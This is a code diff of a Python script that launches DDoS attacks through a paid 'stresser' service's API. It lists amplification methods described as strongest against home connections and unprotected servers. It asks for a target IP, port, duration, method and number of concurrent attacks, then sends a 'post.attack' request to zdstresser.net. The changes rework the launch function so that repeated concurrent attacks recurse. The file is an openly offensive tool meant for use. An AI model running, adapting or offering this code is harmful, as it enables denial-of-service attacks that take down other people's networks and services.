@@ -2,7 +2,6 @@ import requests
 import time
 import json
 
-
 def ddos():
     methodlist = """1	DNS	IPv4 (L3 ,L4)	Method based on Domain Name System, have bigest amplification power. Recomended for home connection, unprotected servers.
 2	4G	IPv4 (L3 ,L4)	Method based on Private Paylod , have bigest amplification power. Recomended for home connection, unprotected servers.
@@ -119,29 +118,25 @@ ID	Name	Type	Description
     print("Here are some methods:\n")
     time.sleep(3)
     print(methodlist)
-    methods = input(
-        "method (name):")  # cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
+    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
     concurrents = input("Concurrents (max 5):")
     hub = "basic"
     payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
-    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4"  # Put your userid and key where it says redacted
-
-    def ddostwo():
-        print("Executing...\n")
-        response = requests.get(baseurl, params=payload)
-        responsejson = response.json()
-        print("Checking response...")
-        for key, value in responsejson.items():
-            print(key, ":", value)
-        print(str("\nSuccess! Executed: ") + response.url)
-
+    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
+    print("Executing...\n")
+    response = requests.get(baseurl, params=payload)
+    responsejson = response.json()
+    print("Checking response...")
+    for key, value in responsejson.items():
+        print(key, ":", value)
+    print(str("\nSuccess! Executed: ") + response.url)
     print("\nSuccess! Executed on target!")
     time.sleep(5)
     if int(concurrents) == 1:
         ddos()
     elif int(concurrents) != 1:
         for i in range(int(concurrents)):
-            ddostwo()
+            ddos()
 
 
 def ddosperm():
@@ -260,11 +255,10 @@ ID	Name	Type	Description
     print("Here are some methods:\n")
     time.sleep(3)
     print(methodlist)
-    methods = input(
-        "method (name):")  # cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
+    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
     hub = "basic"
     payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
-    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4"  # Put your userid and key where it says redacted
+    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
     print("Executing...\n")
 
     def ddosloop():
